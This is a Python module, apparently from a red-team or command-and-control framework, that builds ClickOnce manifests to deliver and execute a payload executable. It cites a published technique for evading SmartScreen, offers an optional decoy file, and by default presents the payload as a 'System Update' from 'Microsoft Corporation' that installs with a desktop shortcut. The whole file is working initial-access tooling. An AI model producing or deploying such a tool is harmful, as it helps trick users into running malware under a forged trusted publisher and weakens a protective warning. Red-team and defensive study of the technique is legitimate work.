"""
ClickOnce Trigger Module
======================
Creates a ClickOnce deployment trigger using the attack vector from:
https://specterops.io/blog/2023/06/07/less-smartscreen-more-caffeine-abusing-clickonce-for-trusted-code-execution/

This trigger leverages ClickOnce's trusted execution model to deliver and execute
the payload while potentially bypassing SmartScreen warnings.
"""

import asyncio
import hashlib
import pathlib
import shutil
import xml.etree.ElementTree as ET
from pathlib import Path


def _calculate_file_hash(file_path: pathlib.Path) -> str:
    """
    Calculate SHA256 hash of a file.
    
    Args:
        file_path: Path to the file
        
    Returns:
        str: Hex-encoded SHA256 hash in uppercase
    """
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest().upper()


async def create_clickonce_trigger(
    payload_exe: str,
    payload_dir: pathlib.Path,
    decoy_file: pathlib.Path = None,
    app_name: str = "System Update",
    app_publisher: str = "Microsoft Corporation",
    app_version: str = "1.0.0.0",
    **kwargs
) -> str:
    """
    Creates a ClickOnce deployment trigger.
    
    The trigger creates a ClickOnce application manifest and deployment manifest
    that, when invoked, will execute the payload through the ClickOnce trusted
    execution environment.
    
    Args:
        payload_exe (str): Name of the executable to trigger (e.g., "erebus.exe")
        payload_dir (pathlib.Path): Directory containing the payload files
        decoy_file (pathlib.Path): Optional decoy file to display
        app_name (str): Application name for ClickOnce manifests
        app_publisher (str): Publisher name in manifests
        app_version (str): Version string for the application
        
    Returns:
        str: Path to the .application deployment manifest
        
    Raises:
        Exception: If manifest creation or file operations fail
    """
    
    try:
        trigger_dir = payload_dir / "clickonce_trigger"
        trigger_dir.mkdir(parents=True, exist_ok=True)
        
        # Create subdirectories for ClickOnce structure
        app_files_dir = trigger_dir / "Application Files"
        app_files_dir.mkdir(parents=True, exist_ok=True)
        
        # Create versioned app directory (AppName_Version)
        app_version_dir = app_files_dir / f"{app_name}_v{app_version}"
        app_version_dir.mkdir(parents=True, exist_ok=True)
        
        # Copy payload executable to versioned directory
        payload_path = payload_dir / payload_exe
        if payload_path.exists():
            shutil.copy2(str(payload_path), str(app_version_dir / payload_exe))
        
        # Copy decoy file if provided
        if decoy_file and decoy_file.exists():
            shutil.copy2(str(decoy_file), str(app_version_dir / decoy_file.name))
        
        # Generate Application Manifest (.exe.manifest)
        app_manifest = _create_application_manifest(
            app_name=app_name,
            app_version=app_version,
            payload_exe=payload_exe,
            payload_exe_path=app_version_dir / payload_exe,
            decoy_file=decoy_file.name if decoy_file else None,
            decoy_file_path=app_version_dir / decoy_file.name if decoy_file else None
        )
        app_manifest_path = app_version_dir / f"{payload_exe}.manifest"
        app_manifest_path.write_text(app_manifest)
        
        # Generate Application Manifest (.application)
        application_manifest = _create_deployment_manifest(
            app_name=app_name,
            app_publisher=app_publisher,
            app_version=app_version,
            payload_exe=payload_exe,
            app_files_dir=app_files_dir,
            app_version_dir=app_version_dir
        )
        application_manifest_path = trigger_dir / f"{app_name}.application"
        application_manifest_path.write_text(application_manifest)
        
        return str(application_manifest_path)
        
    except Exception as e:
        raise Exception(f"Failed to create ClickOnce trigger: {str(e)}")


def _create_application_manifest(
    app_name: str,
    app_version: str,
    payload_exe: str,
    payload_exe_path: pathlib.Path,
    decoy_file: str = None,
    decoy_file_path: pathlib.Path = None
) -> str:
    """
    Creates the application manifest (.exe.manifest) for ClickOnce.
    
    This manifest describes the application's assembly and file dependencies.
    
    Args:
        app_name (str): Application name
        app_version (str): Application version
        payload_exe (str): Executable filename
        payload_exe_path (pathlib.Path): Full path to the executable
        decoy_file (str): Optional decoy file
        decoy_file_path (pathlib.Path): Full path to decoy file
        
    Returns:
        str: XML manifest content
    """
    
    # Calculate hash and size for payload exe
    payload_size = payload_exe_path.stat().st_size if payload_exe_path.exists() else 0
    payload_hash = _calculate_file_hash(payload_exe_path) if payload_exe_path.exists() else "0000000000000000000000000000000000000000000000000000000000000000"
    
    files_xml = f'    <file name="{payload_exe}" size="{payload_size}" />\n'
    if decoy_file and decoy_file_path:
        decoy_size = decoy_file_path.stat().st_size if decoy_file_path.exists() else 0
        files_xml += f'    <file name="{decoy_file}" size="{decoy_size}" />\n'
    
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <asmv1:assemblyIdentity version="{app_version}" name="{app_name}.app" type="win32" processorArchitecture="x64" publicKeyToken="0000000000000000" language="neutral" />
  <description asmv2:publisher="{app_name}" asmv2:product="{app_name}" xmlns="urn:schemas-microsoft-com:asm.v1" />
  <deployment install="true" mapFileExtensions="true" />
  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <framework version="v4.0.30319" profile="Client" supportedRuntime="4.0.30319" />
  </compatibleFrameworks>
  <asmv1:file name="{payload_exe}" hashalg="SHA256" hash="{payload_hash}" size="{payload_size}">
    <asmv2:hash xmlns="urn:schemas-microsoft-com:asm.v2">
      <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" />
      <dsig:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" />
      <dsig:DigestValue xmlns:dsig="http://www.w3.org/2000/09/xmldsig#">{payload_hash}</dsig:DigestValue>
    </asmv2:hash>
  </asmv1:file>
{files_xml}</asmv1:assembly>
'''
    return manifest


def _create_deployment_manifest(
    app_name: str,
    app_publisher: str,
    app_version: str,
    payload_exe: str,
    app_files_dir: pathlib.Path,
    app_version_dir: pathlib.Path
) -> str:
    """
    Creates the deployment manifest (.application) for ClickOnce.
    
    This is the entry point manifest that defines how the application is deployed.
    
    Args:
        app_name (str): Application name
        app_publisher (str): Publisher/company name
        app_version (str): Application version
        payload_exe (str): Executable filename
        app_files_dir (pathlib.Path): Application Files directory
        app_version_dir (pathlib.Path): Versioned app directory
        
    Returns:
        str: XML manifest content
    """
    
    # Calculate file size and hash for assembly
    exe_path = app_version_dir / payload_exe
    file_size = exe_path.stat().st_size if exe_path.exists() else 0
    assembly_hash = _calculate_file_hash(exe_path) if exe_path.exists() else "0000000000000000000000000000000000000000000000000000000000000000"
    
    # Create relative path from app_files_dir
    rel_path = app_version_dir.relative_to(app_files_dir)
    
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1">
  <asmv1:assemblyIdentity name="{app_name}.application" version="{app_version}" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="msil" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" />
  <description asmv2:publisher="{app_publisher}" asmv2:product="{app_name}" asmv2:supportUrl="https://microsoft.com" xmlns="urn:schemas-microsoft-com:asm.v1" />
  <deployment install="true" mapFileExtensions="true" co.v1:createDesktopShortcut="true">
    <subscription>
      <update>
        <beforeApplicationStartup />
      </update>
    </subscription>
  </deployment>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <compatibleFrameworks>
      <framework version="v4.0.30319" profile="Client" supportedRuntime="4.0.30319" />
    </compatibleFrameworks>
  </compatibility>
  <dependency>
    <dependentAssembly dependencyType="install" codebase="{rel_path}/{payload_exe}.manifest" size="{file_size}">
      <assemblyIdentity name="{app_name}.app" version="{app_version}" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x64" type="win32" />
      <hash>
        <dsig:Transforms>
          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
        </dsig:Transforms>
        <dsig:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" />
        <dsig:DigestValue>{assembly_hash}</dsig:DigestValue>
      </hash>
    </dependentAssembly>
  </dependency>
</asmv1:assembly>
'''
    return manifest


if __name__ == "__main__":
    import sys
    
    # Test the trigger creation
    test_payload_dir = pathlib.Path("/tmp/test_clickonce")
    test_payload_dir.mkdir(exist_ok=True)
    
    # Create a dummy exe file for testing
    (test_payload_dir / "erebus.exe").write_bytes(b"TEST_EXE_CONTENT")
    
    result = asyncio.run(create_clickonce_trigger(
        payload_exe="erebus.exe",
        payload_dir=test_payload_dir,
        app_name="System Update",
        app_publisher="Microsoft Corporation"
    ))
    
    print(f"ClickOnce trigger created at: {result}")
